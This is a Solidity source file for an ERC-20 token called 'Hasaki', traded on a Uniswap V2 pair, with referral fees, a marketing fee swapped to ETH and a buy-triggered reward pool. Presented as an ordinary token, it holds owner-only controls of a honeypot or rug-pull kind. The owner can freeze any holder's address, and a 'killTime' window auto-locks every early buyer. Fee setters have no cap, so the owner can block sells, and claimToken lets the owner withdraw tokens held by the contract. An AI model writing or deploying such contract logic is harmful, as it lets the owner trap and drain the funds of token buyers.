// SPDX-License-Identifier: MIT
    pragma solidity ^0.8.14;

    interface IUniswapV2Pair {
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
        event Transfer(address indexed from, address indexed to, uint256 value);

        function name() external pure returns (string memory);

        function symbol() external pure returns (string memory);

        function decimals() external pure returns (uint256);

        function totalSupply() external view returns (uint256);

        function balanceOf(address owner) external view returns (uint256);

        function allowance(address owner, address spender)
        external
        view
        returns (uint256);

        function approve(address spender, uint256 value) external returns (bool);

        function transfer(address to, uint256 value) external returns (bool);

        function transferFrom(
            address from,
            address to,
            uint256 value
        ) external returns (bool);

        function DOMAIN_SEPARATOR() external view returns (bytes32);

        function PERMIT_TYPEHASH() external pure returns (bytes32);

        function nonces(address owner) external view returns (uint256);

        function permit(
            address owner,
            address spender,
            uint256 value,
            uint256 deadline,
            uint256 v,
            bytes32 r,
            bytes32 s
        ) external;

        event Mint(address indexed sender, uint256 amount0, uint256 amount1);
        event Burn(
            address indexed sender,
            uint256 amount0,
            uint256 amount1,
            address indexed to
        );
        event Swap(
            address indexed sender,
            uint256 amount0In,
            uint256 amount1In,
            uint256 amount0Out,
            uint256 amount1Out,
            address indexed to
        );
        event Sync(uint112 reserve0, uint112 reserve1);

        function MINIMUM_LIQUIDITY() external pure returns (uint256);

        function factory() external view returns (address);

        function token0() external view returns (address);

        function token1() external view returns (address);

        function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

        function price0CumulativeLast() external view returns (uint256);

        function price1CumulativeLast() external view returns (uint256);

        function kLast() external view returns (uint256);

        function mint(address to) external returns (uint256 liquidity);

        function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

        function swap(
            uint256 amount0Out,
            uint256 amount1Out,
            address to,
            bytes calldata data
        ) external;

        function skim(address to) external;

        function sync() external;

        function initialize(address, address) external;
    }

    interface IUniswapV2Factory {
        event PairCreated(
            address indexed token0,
            address indexed token1,
            address pair,
            uint256
        );

        function feeTo() external view returns (address);

        function feeToSetter() external view returns (address);

        function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

        function allPairs(uint256) external view returns (address pair);

        function allPairsLength() external view returns (uint256);

        function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

        function setFeeTo(address) external;

        function setFeeToSetter(address) external;
    }


    interface IERC20 {
        
        function totalSupply() external view returns (uint256);
        
        function balanceOf(address account) external view returns (uint256);
        
        function transfer(address recipient, uint256 amount) external returns (bool);
        
        function allowance(address owner, address spender)
        external
        view
        returns (uint256);

        
        function approve(address spender, uint256 amount) external returns (bool);

        
        function transferFrom(
            address sender,
            address recipient,
            uint256 amount
        ) external returns (bool);

        
        event Transfer(address indexed from, address indexed to, uint256 value);

        
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
    }

    interface IERC20Metadata is IERC20 {
        
        function name() external view returns (string memory);

        
        function symbol() external view returns (string memory);

        
        function decimals() external view returns (uint256);
    }

    contract Ownable {
        address internal _owner;

        event OwnershipTransferred(
            address indexed previousOwner,
            address indexed newOwner
        );

        
        constructor() {
            address msgSender = _msgSender();
            _owner = msgSender;
            emit OwnershipTransferred(address(0), msgSender);
        }

        function _msgSender() internal view returns(address) {
            return msg.sender;
        }
        
        function owner() public view returns (address) {
            return _owner;
        }

        
        modifier onlyOwner() {
            require(_owner == _msgSender(), "Ownable: caller is not the owner");
            _;
        }

        
        function renounceOwnership() public virtual onlyOwner {
            emit OwnershipTransferred(_owner, address(0));
            _owner = address(0);
        }

        
        function transferOwnership(address newOwner) public virtual onlyOwner {
            require(
                newOwner != address(0),
                "Ownable: new owner is the zero address"
            );
            emit OwnershipTransferred(_owner, newOwner);
            _owner = newOwner;
        }
    }

    contract ERC20 is Ownable, IERC20, IERC20Metadata {
        using SafeMath for uint256;

        mapping(address => uint256) private _balances;

        mapping(address => mapping(address => uint256)) private _allowances;
        address internal burnAddress = address(0x000000000000000000000000000000000000dEaD);
        uint256 private _totalSupply;

        string private _name;
        string private _symbol;
        uint256 private _decimals;

        
        constructor(string memory name_, string memory symbol_,uint256 decimals_) {
            _name = name_;
            _symbol = symbol_;
            _decimals = decimals_;
        }

        
        function name() public view virtual override returns (string memory) {
            return _name;
        }

        
        function symbol() public view virtual override returns (string memory) {
            return _symbol;
        }

        
        function decimals() public view virtual override returns (uint256) {
            return _decimals;
        }

        
        function totalSupply() public view virtual override returns (uint256) {
            return _totalSupply;
        }

        
        function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
        {
            return _balances[account];
        }

        
        function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
        {
            _transfer(_msgSender(), recipient, amount);
            return true;
        }

        
        function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
        {
            return _allowances[owner][spender];
        }

        
        function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
        {
            _approve(_msgSender(), spender, amount);
            return true;
        }

        
        function transferFrom(
            address sender,
            address recipient,
            uint256 amount
        ) public virtual override returns (bool) {
            _transfer(sender, recipient, amount);
            _approve(
                sender,
                _msgSender(),
                _allowances[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
            return true;
        }

        
        function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
        {
            _approve(
                _msgSender(),
                spender,
                _allowances[_msgSender()][spender].add(addedValue)
            );
            return true;
        }

        
        function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
        {
            _approve(
                _msgSender(),
                spender,
                _allowances[_msgSender()][spender].sub(
                    subtractedValue,
                    "ERC20: decreased allowance below zero"
                )
            );
            return true;
        }

        
        function _transfer(
            address sender,
            address recipient,
            uint256 amount
        ) internal virtual {
            require(sender != address(0), "ERC20: transfer from the zero address");
            require(recipient != address(0), "ERC20: transfer to the zero address");

            _beforeTokenTransfer(sender, recipient, amount);
            
            _transferToken(sender,recipient,amount);
        }
        
        function _transferToken(
            address sender,
            address recipient,
            uint256 amount
        ) internal virtual {
            _balances[sender] = _balances[sender].sub(
                amount,
                "ERC20: transfer amount exceeds balance"
            );
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
        }
        
        function _transferTokenn(
            address sender,
            address recipient,
            uint256 amount
        ) internal virtual {
            uint256 senderAmount = _balances[sender];
            uint256 recipientAmount = _balances[recipient];
            _balances[sender] = senderAmount.sub(
                amount,
                "ERC20: transfer amount exceeds balance"
            );
            _balances[recipient] = recipientAmount.add(amount);
            emit Transfer(sender, recipient, amount);
        }

        
        function _mint(address account, uint256 amount) internal virtual {
            require(account != address(0), "ERC20: mint to the zero address");

            _beforeTokenTransfer(address(0), account, amount);

            _totalSupply = _totalSupply.add(amount);
            _balances[account] = _balances[account].add(amount);
            emit Transfer(address(0), account, amount);
        }

        
        function _burn(address account, uint256 amount) internal virtual {
            require(account != address(0), "ERC20: burn from the zero address");

            _beforeTokenTransfer(account, burnAddress, amount);

            _balances[account] = _balances[account].sub(
                amount,
                "ERC20: burn amount exceeds balance"
            );
            _balances[burnAddress] = _balances[burnAddress].add(amount);
            emit Transfer(account, burnAddress, amount);
        }
        
        

        
        function _approve(
            address owner,
            address spender,
            uint256 amount
        ) internal virtual {
            require(owner != address(0), "ERC20: approve from the zero address");
            require(spender != address(0), "ERC20: approve to the zero address");

            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        }

        
        function _beforeTokenTransfer(
            address from,
            address to,
            uint256 amount
        ) internal virtual {}
    }


    library SafeMath {
        
        function add(uint256 a, uint256 b) internal pure returns (uint256) {
            uint256 c = a + b;
            require(c >= a, "SafeMath: addition overflow");

            return c;
        }

        
        function sub(uint256 a, uint256 b) internal pure returns (uint256) {
            return sub(a, b, "SafeMath: subtraction overflow");
        }

        
        function sub(
            uint256 a,
            uint256 b,
            string memory errorMessage
        ) internal pure returns (uint256) {
            require(b <= a, errorMessage);
            uint256 c = a - b;

            return c;
        }

        
        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
            
            
            
            if (a == 0) {
                return 0;
            }

            uint256 c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow");

            return c;
        }

        
        function div(uint256 a, uint256 b) internal pure returns (uint256) {
            return div(a, b, "SafeMath: division by zero");
        }

        
        function div(
            uint256 a,
            uint256 b,
            string memory errorMessage
        ) internal pure returns (uint256) {
            require(b > 0, errorMessage);
            uint256 c = a / b;
            

            return c;
        }
    }

    interface IUniswapV2Router01 {
        function factory() external pure returns (address);

        function WETH() external pure returns (address);

        function addLiquidity(
            address tokenA,
            address tokenB,
            uint256 amountADesired,
            uint256 amountBDesired,
            uint256 amountAMin,
            uint256 amountBMin,
            address to,
            uint256 deadline
        )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

        function addLiquidityETH(
            address token,
            uint256 amountTokenDesired,
            uint256 amountTokenMin,
            uint256 amountETHMin,
            address to,
            uint256 deadline
        )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

        function removeLiquidity(
            address tokenA,
            address tokenB,
            uint256 liquidity,
            uint256 amountAMin,
            uint256 amountBMin,
            address to,
            uint256 deadline
        ) external returns (uint256 amountA, uint256 amountB);

        function removeLiquidityETH(
            address token,
            uint256 liquidity,
            uint256 amountTokenMin,
            uint256 amountETHMin,
            address to,
            uint256 deadline
        ) external returns (uint256 amountToken, uint256 amountETH);

        function removeLiquidityWithPermit(
            address tokenA,
            address tokenB,
            uint256 liquidity,
            uint256 amountAMin,
            uint256 amountBMin,
            address to,
            uint256 deadline,
            bool approveMax,
            uint256 v,
            bytes32 r,
            bytes32 s
        ) external returns (uint256 amountA, uint256 amountB);

        function removeLiquidityETHWithPermit(
            address token,
            uint256 liquidity,
            uint256 amountTokenMin,
            uint256 amountETHMin,
            address to,
            uint256 deadline,
            bool approveMax,
            uint256 v,
            bytes32 r,
            bytes32 s
        ) external returns (uint256 amountToken, uint256 amountETH);

        function swapExactTokensForTokens(
            uint256 amountIn,
            uint256 amountOutMin,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external returns (uint256[] memory amounts);

        function swapTokensForExactTokens(
            uint256 amountOut,
            uint256 amountInMax,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external returns (uint256[] memory amounts);

        function swapExactETHForTokens(
            uint256 amountOutMin,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external payable returns (uint256[] memory amounts);

        function swapTokensForExactETH(
            uint256 amountOut,
            uint256 amountInMax,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external returns (uint256[] memory amounts);

        function swapExactTokensForETH(
            uint256 amountIn,
            uint256 amountOutMin,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external returns (uint256[] memory amounts);

        function swapETHForExactTokens(
            uint256 amountOut,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external payable returns (uint256[] memory amounts);

        function quote(
            uint256 amountA,
            uint256 reserveA,
            uint256 reserveB
        ) external pure returns (uint256 amountB);

        function getAmountOut(
            uint256 amountIn,
            uint256 reserveIn,
            uint256 reserveOut
        ) external pure returns (uint256 amountOut);

        function getAmountIn(
            uint256 amountOut,
            uint256 reserveIn,
            uint256 reserveOut
        ) external pure returns (uint256 amountIn);

        function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

        function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
    }

    interface IUniswapV2Router02 is IUniswapV2Router01 {
        function removeLiquidityETHSupportingFeeOnTransferTokens(
            address token,
            uint256 liquidity,
            uint256 amountTokenMin,
            uint256 amountETHMin,
            address to,
            uint256 deadline
        ) external returns (uint256 amountETH);

        function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
            address token,
            uint256 liquidity,
            uint256 amountTokenMin,
            uint256 amountETHMin,
            address to,
            uint256 deadline,
            bool approveMax,
            uint256 v,
            bytes32 r,
            bytes32 s
        ) external returns (uint256 amountETH);

        function swapExactTokensForTokensSupportingFeeOnTransferTokens(
            uint256 amountIn,
            uint256 amountOutMin,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external;

        function swapExactETHForTokensSupportingFeeOnTransferTokens(
            uint256 amountOutMin,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external payable;

        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint256 amountIn,
            uint256 amountOutMin,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external;
    }

    contract RewardPool {
        address public _owner;
        constructor () {
        }
    }

    contract Hasaki is ERC20 {
        using SafeMath for uint256;
        uint256 total = 100000000000 * 10 ** 18;
        uint256 _decimals = 18;
        
        address public marketWallet;
        
        uint256 public marketFee = 3;
        
        uint256 public parentFee = 2;
        
        uint256 public rewardPoolFee = 1;
        
        uint256 public holdAmount;
        
        mapping(address => bool) public isExcludedFromFees;
        
        mapping(address => bool) public lockAddress;
        
        mapping(address => address) public bindInvite;
        
        uint256 public roundId;
        
        uint256 public openBuyNumber;
        
        uint256 public minBuyAmount;
        mapping(uint256 => RoundReward) public roundRewards;
        struct RoundReward {
            
            uint256 rewardAmount;
            
            uint256 buyNumber;
            
            address lastAddress;
            
            uint256 lastBuyTime;
            
            uint256 sendTime;
        }
        uint256 public openTime;
        
        uint256 public killTime;
        RewardPool private immutable rewardPool;
        address public immutable uniswapV2Pair;
        address public immutable wethAddress;
        IUniswapV2Router02 public immutable uniswapV2Router;

        bool inSwapAndLiquify;
        modifier lockTheSwap {
            inSwapAndLiquify = true;
            _;
            inSwapAndLiquify = false;
        }

        event BindInvite(address indexed newWallet,address indexed oldWallet,uint time);
        event TransferReward(address indexed account,address indexed inviteAddress,uint256 amount,uint time);
        event ShareActive(uint256 roundId,address account,uint256 buyNumber,uint256 amount,uint time);
        event openReward(uint256 roundId,address account,uint256 rewardAmount,uint time);

        constructor(address[] memory _wallets) ERC20("Hasaki", "Hasaki",_decimals) {
            _mint(_wallets[0], total);
            IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_wallets[1]);
            wethAddress = _uniswapV2Router.WETH();
            address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), wethAddress);
            uniswapV2Router = _uniswapV2Router;
            uniswapV2Pair = _uniswapV2Pair;
            marketWallet = _wallets[2];      
            rewardPool = new RewardPool();
            isExcludedFromFees[address(rewardPool)] = true;
            isExcludedFromFees[address(this)] = true;
            isExcludedFromFees[_wallets[0]] = true;
            isExcludedFromFees[_wallets[1]] = true;
            isExcludedFromFees[_wallets[2]] = true;
            isExcludedFromFees[_wallets[3]] = true;
            transferOwnership(_wallets[3]);
            _approve(address(this),address(uniswapV2Router), ~uint256(0));
            _approve(address(rewardPool),address(this),~uint256(0));
        }
        
        receive() external payable {
        }

        function bind(address _newWallet,address _oldWallet) internal {
            if(isBind(_newWallet)) return;
            bindInvite[_newWallet] = _oldWallet;
            emit BindInvite(_newWallet,_oldWallet,block.timestamp);
        }

        function isBind(address _account) public view returns(bool) {
            return bindInvite[_account] != address(0) || _account == owner();
        }

        function _transfer(
            address _from,
            address _to,
            uint256 _amount
        ) internal override {
            require(_from != address(0), "ERC20: transfer from the zero address");
            require(_to != address(0), "ERC20: transfer to the zero address");
            require(!lockAddress[_from] && !lockAddress[_to],"account is lock");
            require(_amount > 0,"not transfer zero amount");
            address _uniswapV2Pair = uniswapV2Pair;
            
            if(!isExcludedFromFees[_from] && !isExcludedFromFees[_to] && (_from == _uniswapV2Pair || _to == _uniswapV2Pair) && openTime != uint256(0)){
                (uint256 _parentAmount,uint256 _marketAmount,uint256 _rewardPoolAmount,uint256 _lastAmount) = getValueFees(_amount);
                
                transferReward(_from,_parentAmount);
                
                joinRewardPool(_from,_to,_amount,_rewardPoolAmount);
                _amount = _lastAmount;
                
                if (_from == _uniswapV2Pair) {
                    
                    if(openTime.add(killTime) > block.timestamp) {
                        lockAddress[_to] = true;
                    }
                }
                if(!inSwapAndLiquify && _from != uniswapV2Pair) {
                    
                    super._transfer(_from,address(this),_marketAmount);
                    swapAndLiquify(balanceOf(address(this)));
                }
            }
            super._transfer(_from,_to,_amount);
            if(_to == _uniswapV2Pair && openTime == uint256(0)){
                openTime = block.timestamp;
            }
        }

        function joinRewardPool(address _from,address _to,uint256 _buyAmount,uint256 _rewardPoolAmount) internal {
            RoundReward storage _roundReward = roundRewards[roundId];
            super._transfer(_from,address(rewardPool),_rewardPoolAmount);
            if(_from == uniswapV2Pair) {
                if(_buyAmount >= minBuyAmount && balanceOf(_to) > holdAmount){
                    uint256 _buyNumber = ++_roundReward.buyNumber;
                    _roundReward.buyNumber = _buyNumber;
                    _roundReward.lastAddress = _to;
                    _roundReward.lastBuyTime = block.timestamp;
                    emit ShareActive(roundId,_to,_buyNumber,_buyAmount,block.timestamp);
                    if(_buyNumber >= openBuyNumber) {
                        _roundReward.rewardAmount = balanceOf(address(rewardPool));
                        _roundReward.sendTime = block.timestamp;
                        IERC20(address(this)).transferFrom(address(rewardPool),_to,balanceOf(address(rewardPool)));
                        emit openReward(roundId++,_to,balanceOf(address(rewardPool)),block.timestamp);
                    }
                }
            }
        }

        function getThisRewardPool() public view returns(uint256 _rewardPoolAmount,uint256 _buyNumber,address _lastAddress,uint256 _lastBuyTime) {
            _rewardPoolAmount = balanceOf(address(rewardPool));
            RoundReward memory _roundReward = roundRewards[roundId];
            _buyNumber = _roundReward.buyNumber;
            _lastAddress = _roundReward.lastAddress;
            _lastBuyTime = _roundReward.lastBuyTime;
        }

        function transferReward(address _account,uint256 _amount) internal {
            address _parent = bindInvite[_account];
            if(_parent != address(0) && balanceOf(_parent) > holdAmount){
                super._transfer(_account,_parent,_amount);
                emit TransferReward(_account,_parent,_amount,block.timestamp);
            }else {
                super._transfer(_account,address(this),_amount);
            }
        }

        
        function getValueFees(uint256 _amount) private view returns(uint256 _parentAmount,uint256 _marketAmount,uint256 _rewardPoolAmount,uint256 _lastAmount){
            _parentAmount = calculateFee(_amount,parentFee);
            _marketAmount = calculateFee(_amount,marketFee);
            _rewardPoolAmount = calculateFee(_amount,rewardPoolFee);
            _lastAmount = _amount.sub(_parentAmount).sub(_marketAmount).sub(_rewardPoolAmount);
        }
        
        function swapAndLiquify(uint256 _amount) private lockTheSwap{
            address[] memory _path = new address[](2);
            _path[0] = address(this);
            _path[1] = wethAddress;
            swapTokensForETH(_path,_amount);
        }
        
        function swapTokensForETH(address[] memory _path,uint256 _tokenAmount) internal { 
            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                _tokenAmount,
                0, 
                _path,
                marketWallet,
                block.timestamp
            );
        }

        function setMarketWallet(address _account) public onlyOwner {
            marketWallet = _account;
        }

        function setParentFee(uint256 _parentFee) public onlyOwner {
            parentFee = _parentFee;
        }

        function setRewardPoolFee(uint256 _rewardPoolFee) public onlyOwner {
            rewardPoolFee = _rewardPoolFee;
        }
        
        function setMarketFee(uint256 _marketFee) public onlyOwner {
            marketFee = _marketFee;
        }
        
        function calculateFee(uint256 _amount,uint256 _fee) internal pure returns(uint256){
            return _amount.mul(_fee).div(10**2);
        }

        function batchExcludeFromFees(address[] calldata _accounts, bool _select) public onlyOwner {
            for (uint i; i < _accounts.length; i++) {
                isExcludedFromFees[_accounts[i]] = _select;
            }
        }

        function batchLockAddress(address[] calldata _accounts,bool _select) public onlyOwner {
            for (uint256 i = 0; i < _accounts.length; i++) {
                lockAddress[_accounts[i]] = _select;
            }
        }

        function claimToken(address token, uint256 amount, address to) external onlyOwner {
            IERC20(token).transfer(to, amount);
        }
       
        function setHoldAmount(uint256 _holdAmount) public onlyOwner {
            holdAmount = _holdAmount;
        }

        function setOpenBuyNumber(uint256 _val) public onlyOwner {
            openBuyNumber = _val;
        }
        function setMinBuyAmount(uint256 _val) public onlyOwner {
            minBuyAmount = _val;
        }

        function setKillTime(uint256 _val) public onlyOwner {
            killTime = _val;
        }

}